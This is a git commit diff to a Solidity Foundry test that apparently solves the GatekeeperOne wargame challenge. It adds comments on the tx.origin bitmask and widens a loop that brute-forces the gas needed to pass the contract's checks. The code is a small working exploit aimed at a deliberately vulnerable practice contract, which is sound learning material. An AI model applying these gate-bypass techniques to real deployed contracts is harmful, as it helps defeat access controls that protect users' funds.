ff296ecf742b8f6013e8a25b6aa052db764ef11a
upalchowdhury <upal.chowdhury@outlook.com>
2023-05-21 10:10:03 -0400

    added more info about the masking process

--- evm/test/Gatekeeper1.t.sol
+++ evm/test/Gatekeeper1.t.sol
@@ -11,8 +11,13 @@ contract ContractTest is Test {
     GatekeeperOne gate = new GatekeeperOne();
 
     function testexploit(){
+        /**
+         * @notice make 0x11111111 be equal to 0x00001111 using mask 0x0000FFFF
+         * @notice So we need to make 0x00000000001111 be != 0xXXXXXXXX00001111 by using mask 0xFFFFFFFF0000FFFF which will keep the previous values intact
+         * @dev apply mask to`tx.origin` casted to a bytes8 as address is 20 bytes
+         */
         bytes8 _gateKey = bytes8(uint64(tx.origin)) & 0xFFFFFFFF0000FFFF;
-        for (uint256 i = 0; i < 300; i++) {
+        for (uint256 i = 0; i < 400; i++) {
             (bool success, ) = address(gate).call{gas: i + (9000 * 3)}(abi.encodeWithSignature("enter(bytes8)", _gateKey));
             if (success) {
                 break;
